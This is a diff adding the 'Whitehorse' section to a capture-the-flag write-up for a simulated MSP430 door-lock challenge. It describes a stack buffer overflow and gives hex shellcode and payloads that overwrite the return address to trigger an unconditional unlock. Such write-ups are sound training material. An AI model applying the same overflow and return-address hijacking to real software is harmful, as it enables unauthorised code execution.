@@ -139,6 +139,44 @@ outcome.  The address in r4 - 0x24 happens to be the start of the user password.
 
 ## Whitehorse
 
+I notice right away that this one is using the syscall 0x7e to unlock the door.  We are going to
+need to call syscall 0x7f to unconditionally unlock the door since we don't know password.
+
+Also see right away the buffer that is being read is undersized for the amount of data they are
+going to allow the user to enter.  Can i just create my own shell code in the buffer to unlock the
+door and call it by overwriting stacks return address...
+
+Going back to Hanoi challenge, the code to unconditionally unlock door is:
+
+```
+4448 <unlock_door>
+4448:  3012 7f00      push	#0x7f
+444c:  b012 7a45      call	#0x457a <INT>
+```
+
+I have to replace the memory address for the INT function, which for this stage is at 0x4532
+So my shell code will probably be...
+
+```
+30127f00b0123245
+```
+
+Beginning of password on stack is at 0x3a84, so make the function return to that address
+
+```
+30127f00b01232458090a0b0c0d0e010843a
+```
+
+I looked back and saw how I solved this originally, and I had a bit of a unique solution.  My
+previous solution was
+
+```
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa60447f00
+```
+
+Address 0x4460 was a call to the INT() function.  This buffer overrun put the 0x7f instruction
+right on the stack and then had the return go directly to the INT() function itself.
+
 ## Montevideo
 
 ## Johannesburg
